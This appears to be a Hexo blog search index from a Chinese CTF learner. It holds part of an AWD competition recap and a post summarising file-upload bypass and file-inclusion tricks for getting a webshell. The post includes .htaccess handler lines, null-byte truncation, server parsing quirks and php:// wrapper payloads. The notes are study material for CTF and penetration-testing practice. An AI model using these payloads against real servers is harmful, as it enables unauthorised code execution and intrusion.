拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。 白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。 还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。 12345防御方面：首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。 通用防御：上waf，直接吧不想要的请求比如post，get全部给禁掉等等； 设置目录权限，例如上传目录权限给死。 最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。 &emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…]]></content>
      <categories>
        <category>CTF</category>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传常规漏洞总结]]></title>
    <url>%2F2018%2F04%2F01%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[从文件上传到getshell一般找到文件上传页面，常规getshell思路:先检查服务器验证上传文件的逻辑，再想办法绕过 前台js验证——禁用js，burpsuit抓包绕过即可 后台检查MIME——抓包改MIME 后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传 .hatccess上传(apache)——创建一个.hatccseea文件设置命名有”php.gif”的文件当作php文件解析执行：&lt;FilesMatch “php.gif”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传的jpg文件都会以php格式解析：AddType application/x-httpd-php .jpg 后台检查文件后缀名—— 0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)1.php .png(空格改为00) IIS6.0解析漏洞文件 xxx.asp;.jpg (服务器默认不解析;号后面的内容) 文件夹 xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件) apache解析漏洞www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析) iis7.0和nginx解析漏洞www.xxx.com/logo.jpg/*.php(开启fix_pathinfo) 文件包含漏洞和利用 如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞 通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00 文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件上传</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F404.html</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[about]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙） 一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و 如有错误还请各位师傅批评指正。(´･◡･`)]]></content>
  </entry>
  <entry>
    <title><![CDATA[categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"><![CDATA[hi,man]]></content>
  </entry>
  <entry>
    <title><![CDATA[tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
</search>
